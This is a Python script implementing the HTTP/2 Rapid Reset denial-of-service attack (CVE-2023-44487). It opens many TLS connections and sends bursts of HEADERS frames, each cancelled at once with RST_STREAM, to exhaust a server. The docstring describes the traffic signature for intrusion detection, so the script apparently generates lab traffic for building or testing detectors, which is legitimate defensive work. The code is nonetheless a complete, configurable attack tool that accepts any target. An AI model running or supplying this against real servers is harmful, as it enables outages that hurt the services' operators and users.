#!/usr/bin/env python3
"""
http2_rapid_reset.py - CVE-2023-44487 HTTP/2 Rapid Reset simulation.

Opens TLS connections, negotiates HTTP/2 via ALPN, then sends HEADERS +
RST_STREAM for each stream immediately without waiting for a response.
This bypasses SETTINGS_MAX_CONCURRENT_STREAMS because the streams are
cancelled before the server counts them toward the limit, allowing the
attacker to submit an unbounded number of cancelled requests.

OIF signature: rst_flag_cnt very high (one RST per stream per connection),
flow_duration_s short to moderate (TLS handshake + burst of resets),
psh_flag_cnt near zero (no HTTP data frames sent), init_fwd_win_bytes
normal (legitimate TLS handshake, which distinguishes this from a SYN flood).
"""

import ssl
import socket
import sys
import h2.connection
import h2.config
import h2.events

TARGET  = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
PORT    = int(sys.argv[2]) if len(sys.argv) > 2 else 443
CONNS   = int(sys.argv[3]) if len(sys.argv) > 3 else 50
STREAMS = int(sys.argv[4]) if len(sys.argv) > 4 else 100

HEADERS = [
    (':method',    'GET'),
    (':path',      '/'),
    (':scheme',    'https'),
    (':authority', TARGET),
    ('user-agent', 'h2-rapid-reset-test'),
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE
ctx.set_alpn_protocols(['h2'])

print(f"[attack] HTTP/2 Rapid Reset -> {TARGET}:{PORT}  "
      f"{CONNS} connections  {STREAMS} streams/conn")

for i in range(CONNS):
    try:
        raw = socket.create_connection((TARGET, PORT), timeout=10)
        tls = ctx.wrap_socket(raw, server_hostname=TARGET)

        config = h2.config.H2Configuration(client_side=True,
                                            header_encoding='utf-8')
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_connection()
        tls.sendall(conn.data_to_send(65535))

        # Read server preface so the connection is fully established before
        # sending streams; skipping this causes a GOAWAY on incomplete handshake.
        data = tls.recv(65535)
        conn.receive_data(data)
        pending = conn.data_to_send(65535)
        if pending:
            tls.sendall(pending)

        # Rapid reset: HEADERS immediately followed by RST_STREAM for each
        # stream. Flush in a single sendall to maximise burst impact.
        for _ in range(STREAMS):
            sid = conn.get_next_available_stream_id()
            conn.send_headers(stream_id=sid, headers=HEADERS)
            conn.reset_stream(sid)

        burst = conn.data_to_send(65535)
        if burst:
            tls.sendall(burst)

        tls.close()
        raw.close()
    except Exception:
        # Connection refused, TLS error, timeout: keep going.
        pass

print(f"[attack] Done: {CONNS} connections")